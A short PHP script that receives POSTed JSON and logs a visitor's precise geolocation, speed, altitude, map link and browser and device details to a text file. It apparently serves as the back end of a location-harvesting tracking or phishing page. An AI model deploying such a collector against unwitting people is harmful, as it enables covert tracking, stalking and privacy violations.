<?php
$result_file = "result.txt";

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $data = file_get_contents('php://input');
    $location = json_decode($data, true);
    
    if ($location) {
        $timestamp = date('Y-m-d H:i:s');
        $log = "=== Advanced Location Data ===\n";
        $log .= "Timestamp: $timestamp\n";
        $log .= "Latitude: " . $location['latitude'] . "\n";
        $log .= "Longitude: " . $location['longitude'] . "\n";
        $log .= "Accuracy: " . $location['accuracy'] . " meters\n";
        
        if (isset($location['speed']) && $location['speed']) {
            $log .= "Speed: " . $location['speed'] . " m/s\n";
        }
        
        if (isset($location['altitude']) && $location['altitude']) {
            $log .= "Altitude: " . $location['altitude'] . " meters\n";
        }
        
        $log .= "Google Map Link: " . $location['map_link'] . "\n";
        
        if (isset($location['device_info'])) {
            $log .= "\nDevice Information:\n";
            $log .= "User Agent: " . $location['device_info']['userAgent'] . "\n";
            $log .= "Platform: " . $location['device_info']['platform'] . "\n";
            $log .= "Language: " . $location['device_info']['language'] . "\n";
            $log .= "Screen: " . $location['device_info']['screen'] . "\n";
            $log .= "Timezone: " . $location['device_info']['timezone'] . "\n";
        }
        
        $log .= "\n";
        
        file_put_contents($result_file, $log, FILE_APPEND);
    }
}
?>
